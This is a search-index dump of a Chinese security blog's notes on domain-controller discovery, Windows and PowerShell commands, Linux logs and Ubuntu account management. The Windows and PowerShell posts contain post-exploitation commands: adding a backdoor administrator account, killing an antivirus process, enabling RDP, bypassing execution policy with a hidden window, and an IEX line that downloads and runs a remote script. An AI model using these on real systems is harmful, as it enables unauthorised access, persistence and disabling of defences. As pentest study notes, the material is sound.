\"服务器路径\"\n```\n\n","tags":["sqlmap"],"categories":["渗透测试"]},{"title":"查找域控的几个常用方法","url":"%2Fposts%2F24294%2F","content":"\n\n  \n#### 查找域控的几个常用方法\n  \n1.net view\n\n```powershell\nnet view /domain\n```\n\n2.set log\n\n```powershell\nset log\n```\n\n3.通过srv记录\n\n```powershell\nnslookup -type=SRV _ldap._tcp.corp\n```\n\n4.使用nltest\n\n```powershell\nnltest /dclist:corp\n```\n\n5.使用dsquery\n\n```powershell\nDsQuery Server -domain corp\n```\n\n6.使用netdom\n\n```powershell\nnetdom query pdc\n```","tags":["域控"],"categories":["渗透测试"]},{"title":"linux找出最近或者今天被修改的文件","url":"%2Fposts%2F10857%2F","content":"\n\n  \n参考：http://www.hackdig.com/01/hack-42547.htm\n\n\n  \n#### 0x01 列出某个目录下今天创建或者修改的文件\n\n###### 1 显示目录home/ym下，今天创建或者修改的文件\n\n`ls  -al --time-style=+%D | grep 'date +%D'`\n\n参数解释：\n\n```\n-a - 列出所有文件，包括隐藏文件\n-l - 启用长列表格式\n--time-style=FORMAT - 显示指定 FORMAT 的时间\n+％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期-a - 列出所有文件，包括隐藏文件\n-l - 启用长列表格式\n--time-style=FORMAT - 显示指定 FORMAT 的时间\n+％D - 以 ％m/％d/％y （月/日/年）格式显示或使用日期\n```\n\n\n\n###### 2 按字母顺序对结果排序显示\n\n`ls -alX --time-style=+%D | grep 'date +%D'`\n\n###### 3 按文件大小从大到小对结果排序显示\n\n`ls -alS --time-style=+%D | grep 'date +%D'`\n\n\n\n#### 0x02 列出某天所有被修改文件\n\n###### 1 列出当前目录今天被修改的文件\n\n`find . -maxdepth 1 -newermt \"2017-1-8\"`\n\n`find . -maxdepth 1 -newermt \"1/8/2017\"`\n\n###### 2 列出系统中今天被修改的所有文件\n\n`find .  -newermt \"2017-1-8\"`\n\n`find . -newermt \"1/8/2017\"`\n\n\n\n#### 0x03  查找被`访问`过的文件\n\n###### 1 今天被访问的文件\n\n` find /home -atime 0 #查看home 目录下今天被访问的文件`\n\n###### 2 查看几天之内被访问的文件\n\n`find . -atime +2  # -atime n,  File  was last accessed n*24 hours ago.；查看当前目录三天之内被访问的文件`\n\n\n\n#### 0x04 查看被`修改`过的文件\n\n###### 1 今天被访问的文件\n\n` find /home -ctime 0  #查看home 目录下今天被修改过的文件`\n\n###### 2 查看几天之内被访问的文件\n\n`find . -ctime +2  # -ctime n,  File  was last changed n*24 hours ago.；查看当前目录三天之内被修改过的文件`\n\n\n\n#### 0x05 更多查看文件的用法\n\n... ...","tags":["Linux"],"categories":["Linux"]},{"title":"Linux下面一些安全日志文件","url":"%2Fposts%2F62677%2F","content":"\n\n  \n```\n文件 /var/run/utmp 记录现在登入的用户\n\n文件 /var/log/wtmp 记录用户所有的登入和登出\n\n文件 /var/log/lastlog 记录每一个用户最后登入时间\n\n文件 /var/log/btmp 记录错误的登入尝试（注：可以查看电脑是否正在被爆破）\n\n文件 /var/log/auth.log 需要身份确认的操作(可能存在)\n\n```\n\n","tags":["日志"],"categories":["Linux"]},{"title":"Windows命令简记","url":"%2Fposts%2F434%2F","content":"\n\n\n\n  \n#### 1、windows系统基础命令\n  \n```powershell\nipconfig /all 获取ip地址     linux：ifconfig -a\nRoute print   路由信息\nArp -a        arp缓存\nNetsh firewall show config  查看防火墙规则\nNetsh firewall show state   \nNetstat -an   获取端口信息\nWhoami        当前用户权限\nHostname      主机名称\nSet           环境变量\nQuery user    查看远程终端在线用户\nSysteminfo    获取操作系统版本、类型、位数等相关信息、安装；\n-b：      显示包含于常见每个链接或监听端口的可执行组件；\n-o：      显示与每个连接相关的所属进程ID；\n-v：      与b一起使用时将显示包含于为所有可执行组件创建连接或者监听端口的组件；\nNetstat -anb  进程号、端口开放情况、开放端口程序、监听端口组件\nNetsata -ano  tcp/udp协议信息、端口、进程号\nNetstat -anvb 进程号、端口所用协议、调用的可执行组件、第三方进程的系统路径等\nNet start 获取服务信息利用第三方漏洞提权、关闭杀毒软件、防火墙、以及关闭某些防护进程\nNet stop servicesname  停止服务命令\nNet start servicename  开启服务命令\nTasklist /svc          获取运行的进程名称、服务、PID \nDriverquery            查看已安装驱动程序列表\nNet start              查看已经启动的windows服务\nMsinfo32               获取更加详细的信息\nTaskkill               是windows自带的终止进程程序\nTASKKILL [/S system [/U username [/P [password]]]]{ [/FI filter] [/PID processid | /IM imagename] } [/T] [/F]\n#例如：taskkill /pid 452 /f        taskkill /im 360tray /f\n\n#用户管理命令：\nNet user hack 123 /add    添加hack用户 密码为123\nNet localgroup adminnistrators hack /add   添加hack为管理员权限\nNet localgroup adminnistrators    查看当前系统管理员\nNet localgroup \"remote desktop users\" hack /add   加入远程桌面用户组\nNet user hack     查看指定用户的信息\nNet user guest /active:yes   激活guest用户\nNet user guest 123\n```\n\n#### 2、windows系统开启远程桌面（mstsc/rdesktop）\n\n```powershell\n#XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（0：ON、1：OFF）：\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f\n                                                              \n\n#Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016：（0：ON、1：OFF）：\nwmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1\n\n#Winserver2008/2012/Win2k3/win7\nwmic  /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1\n                            \n\n#Winserver2008/2012/\nwmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1\n\n#XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（Metasploit）：\nmeterpreter > run getgui -e\n```\n\n#### 3、查看远程端口\n\n###### 通过注册表查看：\n\n```\nREG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server\\WinStations\\RDP-Tcp /v PortNumber 查询rdp端口号\nset /a port = query hex value \n```\n\n###### 通过命令查看\n\n```powershell\nTasklist /svc |find \"TermService\"\nNetstat -ano |find \"1980\"\n```\n\n\n\n> 本文转载","tags":["Windows命令"],"categories":["渗透测试"]},{"title":"PowerShell基础知识","url":"%2Fposts%2F21874%2F","content":"\n<img src=\"http://image.xpshuai.cn/powershell.jpg\"></img>\n\n<!-- more -->\n\n\n\n# <center><font color=red>PowerShell技术概学</font></center>\n\n\n\n> 本文内容较琐碎，思路较混乱，仅当入门小小小基础吧\n\n\n\n\n\n## Powershell基础\n\n###### 特点\n- 可以面向对象\n- 绑定.net\n- 兼容性好\n- 灵活 \n\n\n\n###### 基本常识\n\n- 在PowerShell下，类似 cmd命令 叫作`cmdlet`  \n- 命令规范：`动词-名词`  ， 不区分大小写\n- 可以直接在cmd中运行`powershell`来打开\n\n\n\n###### 查看PowerShell版本\n\n```\nGet-Host\n或者\n$PSversionTable.PSVERSION\n```\n\n\n\n**ps1文件：**   一个PowerShell脚本其实就是一个简单的文本文件\n\n**运行脚本**\n1.完整路径\n2.当前路径:`./test.ps1`\n\n\n\n###### 基本命令\n\n```powershell\nGet-Command ： 得到所有PowerShell命令\n\nGet-Process ： 获取所有进程\n\nGet-Help  ： 显示有关 Windows PowerShell 命令和概念的信息\n\nGet-History  ： 获取在当前会话中输入的命令的列表\n\nGet-Job ：  获取在当前会话中运行的 Windows PowerShell 后台作业\n\ndir –r\n\n\n```\n\n\n\n###### 执行策略\n\n```powershell\nGet-ExecutionPolicy   #查看当前策略\n\n- Restricted        #脚本不能运行（默认）\n- RemoteSigned      #本地创建的脚本可以运行，但从网上下载的脚本不能运行\n- AllSigned         #仅当脚本由信任的发布者签名时才能运行\n- Unrestricted      #允许所有的脚本运行\n```\n\n###### 绕过本地权限执行脚本\n\n```powershell\npowershell.exe  -ExexutionPolicy ByPass -File xxx.ps1\n\n# -ExexutionPolicy ByPass   绕过执行安全策略\n```\n\n\n###### 本地隐藏绕过权限执行脚本\n\n```powershell\npowershell.exe  -ExexutionPolicy ByPass -WindowStyle Hidden -NoLogo -Nolnteractive -NoProfile -File xxx.ps1\n\n# -WindowStyle Hidden 隐藏窗口\n# -NoLogo    启动不显示版权标志的PowerShell\n```\n\n###### 用IEX下载远程PS1脚本绕过权限执行脚本\n\n```powershell\npowershell.exe  -ExexutionPolicy ByPass -WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString(\"xxx.ps1\");[Parameters]\n\n# -NonI   非交互模式\n# -NoProfile  /     -NoP         不加载当前用户的配置文件\n\n# Noexit    执行后不退出Shell  （这在使用键盘记录等脚本时非常重要）\n\n```\n\n\n\n\n\n可以直接在终端进行数字计算.....笑死\n\n\n\n**自定义Powershell控制台**\n右键自己看着自己的习惯调整吧  \n编辑选项：\n\n- 快速编辑选项（操作快且方便）\n- 标准编辑选项\n\n**Powershell快捷键**\n与linux中相似\n```bash\nalt+F7\t\t\t#清除命令的历史记录\nPgUp   PgDn\t\t#翻页的效果\nEsc\t\t#情况命令行（我还是喜欢 ^L）\nHome\t#移动到命令行最左端\nEnd\t\t#移动到命令行最右端\n```\n\n###### Powershell管道和重定向\n基于对象的\n\n管道：\n```bash\n#找字符串\nls | findstr \"an\"\n\n# 查看name列\nls | Format-table  name\n# 还可以sort等\n\n`get-process p* | stop-process`   # 找到p...的进程，然后停止\n```\n\n重定向：\n```bash\n# >,  >>\n\n#重定向到文件中\nls | Format-table  name >> test.txt\n\n```\n\n\n\n###### Powershell数学运算\n直接在终端执行即可，无需多讲\n\n- 进行存储单位换算：\n- 运算/比较\n```\n#运算\n1gb/1mb*18kb\n# 比较\n1gb -gt 1mb\n```\n\n- 进制转换，比如十六进制：`0xa`\n\n#### Powershell执行外部命令\n打开应用\n```\n#直接打开\nnotepad\n\n#或者带双引号\n&\"notepad\"\n\n# 直接打开服务\nservices.exe\n\n# 查看环境变量\n$env:path\n\n# 仅在当前终端设置环境变量（临时生效）\n$env$path=$env$path+\"路径\"\n```\n\n\n#### Powershell命令集\n>一般是`动词-名词`结构\n\n查看所有命令：`Get-Command`\n查看命令帮助: `get-help`\n查看命令历史：`get-history`\n\n\n###### Powershell别名\n**使用**\n```powershell\n# 查看所有别名\nget-alias\n\n# 可以查看命令别名\nget-help 命令\n\n# 查看别名对应的真实的命令\nget-alias -name ls\n\n# 找出以remove开头的别名():\nget-alias | where {$_.definition.startswitch(\"Remove\")}\n\n# 查询所有别名最多的，并排序\nget-alias |group-object definition |sort -descending Count\n```\n\n**自定义别名**\n```powershell\n# 临时定义（退出终端就不生效了）\nset-alias -name pad -value notepad`\n# 删除别名  \ndel alias pad\n\n## 永久设置别名（写入Windows PowerShell profile文件）\n#1.查看此文件在计算机中的位置：\n$profile\n#2.一般该文件在没有创建前是不存在的，使用以下命令为当前用户创建profile命令并返回文件地址：\nNew-Item -Type file -Force $profile\n#3.打开文件将一些内容写入文件，创建别名，比如;\nSet-Alias notepad++ \"C:\\Development Kit\\Notepad++\\notepad++.exe\"\n\n\n# 导出别名\nexport-alias demp.ps1\n\n# 导入别名\nimport-alias -force demo.ps1\n```\n\n\n#### Powershell变量\n**变量基础**\n```\n#定义变量\n$name=\"hhh\"\n#打印 直接$name\n\n\n# Note: 大小写不敏感，所以特殊变量尽量用花括号\n${\"i am a boy\"}=\"ggggg\"\n\n# 可以直接运算\n$n=(2+8*10)/2\n\n# 多个变量同时值\n$n1=$n2=1\n$m, $n=1, 2\n\n#调换变量值\n$n1, $n2=$n2, $n1\n\n```\n\n**变量操作**\n```powershell\n# 查看变量是否存在  test-path\ntest-path variable:$n1\n\n# 删除变量\ndel variable:$n1\n\nremove-variable\n\n\n## powershell提供了五个专门管理变量的命令\nClear-Variable\nGet-Variable\nNew-Variable\nRemove-Variable\nSet-Variable\n\n\n### 变量写保护（只读）\n#1.设置\n$server = '10.10.10.10'\nSet-Variable server -option Readonly\n#2.新建时\nNew-Variable nu1 -Value 100 -Force -Option readonly\n#上面的变量不能更改，但是可以通过删除变量(del Variable:num -Force)，再重新创建变量更新变量内容。\n\n# 选项Constant，常量一旦声明，不可修改\nnew-variable num -Value \"strong\" -Option constant\n```\n\n**自动化变量**\n1.用户信息：例如用户的根目录$home\n2.配置信息:例如powershell控制台的大小，颜色，背景等。\n3.运行时信息：例如一个函数由谁调用，一个脚本运行的目录等。\n\n```powershell\n# 比如：终端一打开就自动加载的变量\n\n# 用户根目录\n$home\n\n\n# 跟linux下基本一样\n$$\t\t#包含会话所收到的最后一行中的最后一个令牌。\n$^\t\t#包含会话所收到的最后一行中的第一个令牌。\n$?      #上一个命令的返回值\n$_\t\t#包含管道对象中的当前对象\n$pid\t#进程id\n$null\n$Host\n$LastExitCode    #包含运行的最后一个基于 Windows 的程序的退出代码。\n\n```\n参考：[这里](https://www.pstips.net/powershell-automatic-variables.html)\n\n**环境变量**\n```powershell\n#查看环境变量\nls env\nls env:name\n\n#查看具体环境变量的值\n$env:windir\n\n# 新建用户环境变量(临时)\n$env:name=\"xxx\"\n# 新建环境变量(长久)\nxxx\n\n# 在环境变量的PATH下添加一条内容\n$Env:path=$Env:Path+\";C:\\Go\\bin\"  \n\n# .net方式只对用户变量生效\n[environment]::setenvironment(\"PATH\",\"D:\\\",\"User\")\n# .net获取值\n[environment]::getenvironment(\"PATH\",\"User\")\n\n# 删除环境变量\ndel env:name\n#或\nremove-item env:name\n```\n\n\n\n\n#### 在其他脚本中使用powershell\n```powershell\n#比如bat\n@echo off\npowershell  \"&'c:\\Users\\test\\e.psl'\"\n\n```\n\n\n#### Powershell条件判断\n###### 条件操作符\n```powershell\n-eq\t\t等于\n-ne\t\t不等与\n-gt\t\t大于\n-lt\t\t小于\n-le\t\t小于等于\n-contains\n#布尔\n-not\t取反\n-ant\n-or\n-xor\n\n\n# 比如：\n80 -eq\t70\n1gb -gt lmb\n(1,2,3) -contains 2\n\n```\n\n###### if语句\n写脚本编辑器ISE里面了\n```powershell\n$num=56\nif($num -gt 50 -and $num -lt 60)\n{\n    \"大于50且小于60\"\n}\nelseif($num -eq 50)\n{\n    \"等于50\"\n}\nelse\n{\n    \"小于50\"\n}\n```\n\n###### switch语句\n```powershell\n$num=45\nswitch($num)\n{\n    {($_ -lt 50) -and ($_ -gt 40)} {\"小于50且大于40\"}\n    50 {\"等于50\"}\n    {$_ -gt 50} {\"大于50\"}\n\n}\n\n```\n\n\n#### Powershell循环结构\n###### foreach语句\n\n```powershell\n$arr=1..10\n\nforeach ($n in $arr)\n{\n    if($n -gt 5)\n    {\n        $n\n    }\n}\n\n```\n\n打印路径中大小大于多少的文件\n```powershell\n\n$pat_val=dir D:\\antSword\nforeach ($file in $pat_val)\n{\n    if($file.length -gt 1kb)\n    {\n        $file.name\n    }\n}\n\n```\n\n\n###### while语句\nwhile\n```powershell\n$num=15\nwhile($num -ge 10)\n{\n    $num\n    $num --\n}\n```\ndo ... while(先运行一次)\n```powershell\n$num=15\ndo\n{\n    $num\n    $num --\n}while($num -ge 10)\n\n\n```\n\n###### continue与break\nbreak\n```powershell\n$num=1\nwhile($num -le 10)\n{\n    if($num -eq 4)\n    {\n        break\n    }else\n    {\n        $num\n    }\n    $num++\n}\n```\n\ncontinue\n```powershell\n$num=1\nwhile($num -lt 10)\n{\n    if($num -eq 4)\n    {\n        $num++\n        continue\n    }else\n    {\n        $num\n        $num++\n    }\n}\n```\n\n\n###### for语句\n```powershell\n$num=0\nfor($i=1; $i -le 100; $i++)\n{\n    $sum+=$i\n    $sum\n}\n```\n\n###### switch实现循环\n```powershell\n$num=1..10\nswitch($num)\n{\n    {($_ % 2) -eq 0}{\"此数值是偶数：$_\"}\n    {($_ % 2) -ne 0}{\"此数值是奇数：$_\"}\n    default{\"num=$_\"}\n}\n```\n\n\n#### Powershell数组\n###### 数组的创建\n```powershell\n# 1.\n$arr=1,2,3,4\n\n# 2.\n$arr=1..5\n\n# 3.可以支持不同类型的值\n$arr=1,\"hhh\",(get-date)\n\n# 4.空数组\n$arr=@()\n\n# 5.有个逗号就行\n$arr=,1\n\n# 6. 命令执行结果的每一行作为一个数组元素\n$arr=ipconfig\n\n#判断是否为数组\n$arr -is [array]\n\n```\n\n###### 访问数组\n```powershell\n$arr[0]\n$arr[-1]\n\n$arr[0..2]  # 取出0,1,2\n\n$arr.Count  # 元素个数\n\n$arr[($arr.Count)..0]  # 倒序\n\n$arr+=\"haha\" # 增加元素\n\n```\n\n#### Powershell函数\n###### 自定义函数及调用\n```powershell\nfunction test\n{\n    ping www.xpshuai.cn.\n}\n\ntest  # 调用\n```\n传参\n```powershell\nfunction test($site)\n{\n    ping $site\n}\n\ntest www.xpshuai.cn # 调用\n\n# 多个参数\ntest p1 p2\n\n```\n\n\n\n###### 函数返回值\n```powershell\nfunction add($n1, $n2)\n{\n    $c=$n1,$n2\n    $sum=$n1+$n2;\n    $sum.gettype().fullname   # 数据类型\n    if($sum.gettype().fullname -eq \"System.Double\")\n    {\n        \"c为数组，索引取值: $c[0]\"\n        return $n1,$n2,$sum,\"double浮点数\"\n    }\n    return $n1,$n2,$sum\n}\n\nadd 1 2.5 # 调用\n```\n\n#### Powershell定义文本\npowershell中转义符是反引号\n```powershell\n\"hello先执行命令: $(Get-Date)\"\n\n\"hello表达式: $(5*6)\"\n\n\"单双引号hello, my name is '哈哈'\"\n\n\"都用双引号，用反引号转义：hello, my name is `\"哈哈`\"\"\n\n\n# 换行符:`n     回车: `r\n\"你好啊 `n 朋友 `n 我换行啦\"\n```\n\n\n#### Powershell实现用户交互\nread-host\n```powershell\n\n$input=read-host \"请输入用户名\"\n\"您好，你输入从用户名为: $input\"\n```\n\n#### Powershell格式化字符串\n```powershell\n# 格式化之前\n$name=\"lili\"\n$age=20\n$gender=\"girl\"\n\"My name is $name, i am $age years old, and i am a $gender\"\n\n\n# 格式化          -f\n$name=\"lili\"\n$age=20\n$gender=\"girl\"\n\"My name is {0}, i am {1} years old, and i am a {2}, {3}.\" -f $name,$age,$gender,$(3*6)\n#运算的话，尽量用小括号括起来\n\n```\n\n\n#### String对象方法\n对字符串的操作\n```powershell\n$str=\"D:\\Desktop\\Cobalt strike4\\test\\a.txt\"\n\n$str.Split(\".\")[-1]  # 以.点分割，然后取最后一位\n$str.endswith(\"ll\")   # 是否以ll结尾\n$str.Contains(\"txt\")  # 是否包含某个字符串\n$str.CompareTo(\"D:\\Desktop\\Cobalt strike4\\test\\a.txt\")  # 判断两个字符串是否相等\n$str.IndexOf(\"w\")  # 找出w的索引位置\n$str.Insert(3,\"hhh\") # 在索引3地方插入hhh\n$str.Replace(\"c\",\"C\")  # 替换\n$str.Remove(0)   # 删除\n\n```\n\n\n#### Powershell操作注册表\n```powershell\n#切换到根键\ncd hkcu:\ncd ..\nexit\n# 切换到别的根键\ncd HKLM:\n\n# 获取\nget-ItemProperty\n# 设置\nset-ItemProperty\n\n# 移除\nremove-ItemProperty\n\n# 等等其他\n\n命令\t\t\t\t\t\t\t描述\nDir, Get-ChildItem\t\t\t列出键的内容\nCd, Set-Location\t\t\t更改当前（键）目录\nHKCU:, HKLM:\t\t\t\t预定义的两个重要注册表根目录虚拟驱动器\nGet-ItemProperty\t\t\t读取键的值\nSet-ItemProperty\t\t\t设置键的值\nNew-ItemProperty\t\t\t给键创建一个新值\nClear-ItemProperty\t\t\t删除键的值内容\nRemove-ItemProperty\t\t\t删除键的值\nNew-Item, md\t\t\t\t创建一个新键\nRemove-Item, Del\t\t\t删除一个键\nTest-Path\t\t\t\t\t验证键是否存在\n```\n\n\n\n#### Powershell文件操作\n\n```powershell\n# 新建目录\n New-Item xxxx -type directory      # 或者 md test\n# 新建文件\n New-Item xxxx.txt -type File\n# 删除目录\nRemove-Item test\n# 显示文本内容\nGet-Content test.txt\n# 设置文本内容\n Set-Content .\\test.txt -Value \"哈哈哈哈哈哈哈\"\n# 追加内容\nAdd-Content .\\test.txt -Value \"嘻嘻嘻嘻嘻嘻嘻嘻\"\n# 清除内容\n Clear-Content .\\test.txt\n\n```\n\n\n\n\n\n## 常用的PowerShell攻击工具：\n\n- PowerSploit\n- NiShang         \n- Empire            (基于PowerShell的远控木马)\n- PowerCat        (PowerShell版的NetCat)\n\n\n\n## 其他技巧\n... ...  ","tags":["PowerShell"],"categories":["渗透测试"]},{"title":"ubuntu server-账号管理","url":"%2Fposts%2F19367%2F","content":"\n\n​    \n\n\n## <font color=red>用户账号管理基础</font>\n**用户账号管理**\n- 为新员工创建账号\n- 修改账号密码策略\n- 禁用休假员工账号\n- 删除离职员工账号(一般先禁用, 如果要删除, 注意提前把重要文件备份)\n- 设置账号访问权限(只赋予其工作必需的权限)\n\n**每个人保管自己的密码**\n- 不要将密码泄露给任何人\n- 保证密码复杂度\n- 不要将密码写在纸条贴在限制器上\n\n#### 关于Linux账号管理基础知识\n**Root账号**\n- 能做任何事情（甚至删除操作系统自身）\n- 大部分Linux发行版安装时要求设置root账号密码\n- 而Ubuntu默认禁用Root账号\n\t- 可`sudo`或`临时切换为root`账号\n\t- 可手动启用root账号\n- 平时以普通员工账号管理计算机\n- 在Ubuntu中执行`sudo rm -rf /`后，有提示\n\n**安装过程中创建管理员个人账号：** 作为日常管理使用\n\n\n**创建账号**\n```bash\n# 本机用户账号存储文件: `/etc/passwd`  \n# 冒号分隔：第二列是占位符(x来代替密码，此文件不存储密码,在shadow中)，第三四列（uid,组id）root的id是0，第五列是用户描述，第六列是主目录,最后一列是终端类型\n# 逗号分隔的部分：\n\n# 创建用户（useradd） 建议添加-m参数\nuseradd user01 -m   # 一般是这样使用多\nuseradd user01 -m -d /home/user01   # -d自定义主目录位置，父目录必须是存在\n\n# 如果只是sudo useradd user01    #是没有用户家目录的，且该用户的终端为sh\n# 新添加的账号的uid是递增的（系统会自动创建一个和uid相同的组id组账号）\n\n# 参数：\n-d\t\t# 账号主目录（复制于/etc/skel）\n-m\t\t# 同时创建主目录（默认首次登录时创建主目录）   用户主目录内容拷贝自`/etc/skel`\n-c\t\t# 全名（描述,即/etc/passwd中第五列那个）\n-e\t\t# 账号过期（YYYY-MM-DD） -- 适合临时工作的人\n-N\t\t# 不创建同名组账号(gid会默认设置为100)   useradd user01 -m -N\n-g\t\t# 指定主组（必须已经存在）\t\tuseradd user01 -m -g sudo\n-G\t\t# 额外组\n\n\n\n# Note:\n账号名最长32个字符（不要以数字或其他特殊字符开头）\n\n\n# 给用户设置密码\nsudo passwd user02\n```\n\n\n\n## <font color=red>账号数据库</font>\n**1./etc/passwd**\n格式：`用户名:密码占位符:UID:GID:全名(描述),房间号,公司电话,家庭电话,others:主目录:shell`\n\n\n**2./etc/shadow**\n存放密码等其他相关信息, 默认root才能查看与读写\n格式：`用户名:密码:上次修改时间:密码最小使用期限:密码最长使用期:'密码'过期前几天提醒:密码过期几天后账号会被锁定:'账号'过期日(距离1970-01-01的天数):保留`\n\n- 密码位置为`!`、`*`的账号不能直接登陆系统(其他账号登录可切换为其账号) , `!`表示密码被锁定\n- 上次修改时间：自从1970-01-01起的`天数`，如果为`0`表示用户下次登陆需要修改密码，`空`表示关闭密码过期功能(不会被锁定)\n- 密码最长使用期限<密码最小使用期 时候，用户无法更改密码(一般会设置密码有效期为90天) \n- 密码过期几天后账号会被锁定： \n\t- 账号过期用户不能登录\n\t- 密码过期看是否锁定账号\n\n\n>账户修改：建议多登陆几个会话备用，防止手滑出现问题导致登不上去\n\n\n**设置账号密码**\n```bash\npasswd user01\n\n# 参数：\n-l\t\t# 锁定账户密码   sudo passwd -l user01\n-u\t\t# 解锁账号   sudo passwd -u user01\n-d\t\t# 删除密码（账号无密码可登录）\n-n/-x   # 密码最小 / 最大 使用期限\n-w\t\t# 密码过期前几天发警告\n-i\t\t# 密码过期后锁账号\n-e\t\t# 密码立刻过期（下次登录必须修改密码）\n-s\t\t# 查看账号的密码状态(L 锁定, P有密码,NP没密码 )  passwd -aS\n\n# 查看账号密码状态（同上）\npasswd -a -S\n```\n\n**添加账号**\nadduser   参数少，更简洁  \n```bash\nadduser user02\n# 基于useradd的perl脚本\n# 并非所有Linux发行版中都包含\n# 向导方式运行（不需记忆命令参数）\n# 位置： /usr/sbin/adduser\n\n\n# 另一个批量添加账号   newusers\nsudo newusers users.txt  # 文件内容按passwd格式填写:   user05:pass15:::hahaha:/home/user15:/bin/bash\n```\n\n\n**删除账号**\nuserdel或deluser\n```bash\n\nsudo userdel user02 # 不会删除主目录\nuserdel -r user02   # 删除账号同时删除主目录（一般先禁用几个月等到不需要一下文件时候再删除但是要提前备份）\nuserdel -f user02   # 强制删除文件\n\nrm -rf /home/user02   # 删除用户主目录\n```\n\n**切换账号**\n```bash\n# 切换到root账号\nsu\t\t\t# 需要输入root密码（默认root没密码,先给root设密码[sudo passwd root]再操作）\nsudo su\t\t# 输入当前账号密码(是输入的当前账号的密码)\nsudo -i\t\t# 同上（root前面的命令提示符是井号）  exit退出到自己的回话\nsudo -s\t\t# 同上\n\n# 切换到其他账号\nsu user01\t# 切换到其他账号（输入的user01的密码）\nsudo su user01\t#切换到其他账号（输入的是当前用户的密码）\n```\n\n\n\n## <font color=red>组账号管理</font>\n>分组归类统一管理\n\n- 将用户账号分组管理和指派权限  \n- 用户创建同时生成同名的组账号  \n- 每个文件有`唯一`的所属账号和所属组（属主、数组）\n\t- 每个用户可以同属属于多个组，但`只有一个主组`  \n\n查看当前用户所属的组： `groups` \n\ncat /etc/groups\n格式： `组名:密码(通常不使用):GID:逗号分隔的'成员'用户账号`\n\n\n**组管理**\n```bash\nsudo groupadd g_name\t\t# 添加组\nsudo groupdel g_name\t\t# 删除组\n\ngpasswd -a u_name g_name\t# 将用户加入'额外组'\ngpasswd -d u_name g_name    # 将用户从组中删除\n\nusermod -aG g_name user\t# 将用户加入'额外组'  a是添加,G是组\n\t# -a    附件（否则替换）\nusermod -g g_name user  # 修改用户的'主组'    -g    把user01的主组改为IT: sudo usermod -g IT user01\n\nusermod -d /home/user2 user2 -m  # 将某用户主目录内容移动到当前目录\nusermod -l user2 user1\t\t# 将用户user1修改为user2(只是名称换了，其他的权限和id都不变)\n\n# 等等其他参数......\n\n```\n\n\n## <font color=red>密码策略</font>\n使用足够复杂的密码  \nPluggable Authentication Module(PAM)  \n```bash\n# 安装pam\napt install libpam-cracklib\n\n# vim /etc/pam.d/common-password    增加配置\npassword      required    pam_pwhistory.so.remember=9 use_authok\n# 最近几次的密码不能相同\n```\n\n###### 权限\n每个文件和文件夹拥有唯一的属主和属组（`ls -l`）\n\n**权限类型：**\n- r, w, x\t\t\t读，写，执行\t\t4, 2,\t1 （这个数字是二进制转换来的，假设数组的权限为r--,对应二进制为100,转为十进制为4，其他类似）\n- u，g，o\t\t属主，属组，其他\n\n```\n# 除了第一位，后面每三位一组（所有者u，所有组g，其他用户o）\n-rwxrwxrwx\n\n# 权限\t\t文件\t\t\t\t\t   文件夹\n# R\t\t读取文件内容，拷贝\t\t 列出目录内容\n# W\t\t更改文件内容\t\t\t\t 创建、删除文件及文件夹\n# X\t\t作为应用程序执行文件\t\t cd进入；读取文件属性和权限\n```\n\n**权限修改命令：**\nchmod\n```bash\n## 只有其属主和root可以修改权限\n\n## 对文件\n# + - 方式\nchmod u+x a.txt\nchmod u-r a.txt\nchmod g-x a.txt\nchmod o+r a.txt\n\n# 数字方式 \nchmod 777 b.txt\nchmod 764 b.txt\n\n\n## 对目录(一般都给x权限，不然cd不进去)\nchmod u+x code/\nchmod u-wx code/  \n# 对目录：r只能看到里面的文件，要写看到属性，得加x权限\n# 父级目录的权限/子文件的权限\n\n# 递归修改权限\nchmod 770 -R code/\n\n\n## 权限与搜索\nfind . -perm 770   # 搜索权限为770的文件\n#  -type f   只搜文件；    -type d  只搜目录\nfind /path/dir/ -type f perm 664 -user xps -group xps  # 属于xps组，属于xps用户，权限为664的文件\nfind /path/dir/ -type f perm 755 -user xps -exec ls -l {}\\;   # 搜索完之后执行命令\nfind /path/dir/ -type f perm 755 -user xps -exec chmod 770 {}\\;   # 搜索完之后再进行权限修改\n\n# 如果用户删了，并且该用户有文件没删除干净，下面找到没有所属用户的文件或文件夹\nfind /home -nouser -exec rm -rf {}\\;    # 查找无有效属主对象，然后删除\n```\n\n\n\n## <font color=red>属主与属组</font>\n**修改属主和属组**\n```bash\n# chown需要sudo\nsudo chown user01 a.txt   # 修改a.txt的所有者为user01\nsudo chown -R user01 /code   # 递归修改目录的所有者\n\n# 修改所有组为user01\nsudo chgrp user01 a.txt\n# 所有者和所有组都修改\nchown user01:user01 a.txt\n```\n\n**特殊权限**\n1. Setuid(4)\n主要针对可执行程序  \n一旦设置了suid之后：任何用户执行程序时都具备使用属主的权限\n设置：`chmod u+s a.sh`或`chmod 4777 /bin/cat` (前面三个二进制, 二进制为100,即4；第二种数值方式对链接不生效)\n比如使用`passwd`修改自己密码的时候修改的是shadow文件(他的属主是root)，它就是设置了`s`权限\n<img src=\"http://image.xpshuai.cn/20200318203240319_8090.png\" />\n>如果不太懂，尽量不要随便设置suid，否则后患无穷\n\n2. Setgid(2)\n主要针对可执行程序和目录\n对于程序一旦设置了sgid：任何用户执行程序时都具备使用属组的权限\n应用于目录时：可实现`共享文件访问效果`(新建文件的数组集成目录属组):  一个用户再在里面新建文件之后，一个组里的用户就都可以共享\n设置：`chmod g+s code/`或`sudo chmod 2775 /bin/cat`\n设置完之后，数组位置权限就多了s权限\n<img src=\"http://image.xpshuai.cn/20200318203113628_4438.png\" />\n\n3. stick bit(1)\n`针对目录`的受限删除位（root、属主可以删）\n典型例子：`/tmp`目录\n设置： `chmod o+t code/`\n加了stick位(其他用户的位置)，自己创建的文件只有自己能删除，别人无法删除\n<img 